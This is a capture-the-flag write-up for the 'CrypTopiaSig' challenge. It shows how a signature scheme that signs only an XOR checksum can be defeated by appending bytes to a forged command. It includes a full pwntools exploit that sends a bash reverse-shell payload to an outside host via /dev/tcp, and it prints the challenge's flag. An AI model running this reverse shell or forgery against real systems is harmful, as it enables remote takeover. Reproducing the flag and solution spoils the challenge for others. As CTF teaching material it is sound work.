## CrypTopiaSig

### Description

We just found a breach in CrypTopia servers, and we have a shell access!
However, they are using a custom shell to run commands in an authenticated way.
We managed to exfiltrate the source code and a sample file, can you find a way to execute commands??

**Author: algorab**

### Solution

#### Analysis

In the algorithm, one section catches attention: the signing algorithm.

```python
def __sign(self, gen, key, mod):
    bl = gen.bit_length()
    for i in range(len(self.data)):
        gen = (gen ^ (self.data[i] << (i % bl))) & 2**bl-1
    s = 1
    while key:
        if key & 1:
            s = s * gen % mod
        key = key >> 1
        gen = gen * gen % mod
    return s
```

We can see that, in this algorithm, the signature is derived from some kind of checksum of the data instead of the data itself. For each byte of the data, the generator is xored with this byte with a bit offset equal to its index in the data, modulo the length of the generator. Then, the signature is equal to `pow(checksum, key, mod)`.

Therefore, the signature relies on the checksum of the data instead of the data itself! Also, we have a signature already generated for us, which means that if we manage to craft data with same checksum than the example payload, we can execute whatever we want!

#### Exploitation

1. First, we decide our payload, which will be a reverse shell here: `payload = b"bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1';#"`. The `;#` is added so that we can add data after it to match the targeted checksum.
2. Then, we have to pad our payload with an arbitrary character to put the offset at the first bit. This can be done this way:
```python
def pad(data, gen, char):
    while len(data) % gen.bit_length() != 0:
        data += char
    return data
```
**We have to make sure that the checksum of our padded payload has the same bit size of the checksum of the original payload, otherwise there will be inconsistent checksum sizes afterwards.**

3. Then, by using the XOR of the targeted checksum and the checksum of the padded payload, we can add either `\x01` or `\x02` to flip or not the bit at each position to finally match the targeted checksum. Note that we cannot use `\x00`, as this would raise an exception during the execution of the code.

4. Finally, craft a correctly formated base64 data to submit to the service, and enjoy the shell!

Here is the full code:
```python
from base64 import b64encode
from pwn import *

host = sys.argv[1]
port = int(sys.argv[2])

G = 0x8b6eec60fae5681c
MAGIC = b"\x01\x02CrypTopiaSig\x03\x04"

def chksm(data, gen):
    bl = gen.bit_length()
    for i in range(len(data)):
        gen = (gen ^ (data[i] << (i % bl))) & 2**bl-1
    return gen

def pad(data, gen, char):
    while len(data) % gen.bit_length() != 0:
        data += char
    return data

def create(data, signature):
    header = MAGIC + len(data).to_bytes(6, 'big') + len(signature).to_bytes(6, 'big')
    return header + data + signature

def parse(data):
    length = int.from_bytes(data[len(MAGIC):len(MAGIC)+6], 'big')
    signature_length = int.from_bytes(data[len(MAGIC)+6:len(MAGIC)+12], 'big')
    header = data[:len(MAGIC)+12]
    signature = data[len(MAGIC)+12+length:len(MAGIC)+12+length+signature_length]
    data = data[len(MAGIC)+12:len(MAGIC)+12+length]
    return header, data, signature

original = b'echo "The date is $(date)\nYou are $(whoami)\nCurrent directory is $(pwd)"'
payload = b"bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1';#"

original_chksm = chksm(original, G)
payload_chksm = chksm(payload, G)

x = bin(original_chksm ^ payload_chksm)[2:]

pad_char = 1
ext_payload = pad(payload, G, bytes([pad_char]))
while len(bin(payload_chksm)) != len(bin(chksm(ext_payload, G))):
    pad_char += 1
    ext_payload = pad(payload, G, bytes([pad_char]))

for i in range(len(x), 0, -1):
    bit = x[i-1]
    if bit == '1':
        ext_payload += b"\x01"
    else:
        ext_payload += b"\x02"
    payload_chksm = chksm(ext_payload, G)
    x = bin(original_chksm ^ payload_chksm)[2:]

_, _, signature = parse(open("example.ctpsig", 'rb').read())

b64payload = b64encode(create(ext_payload, signature))

conn = remote(host,port)
conn.recvuntil(b"$ ")
conn.sendline(b64payload)
conn.close()
```

###

The flag is located in `/app/.passwd` and is `N0PS{d0nT_s1gN_W17h_ChK5uMz}`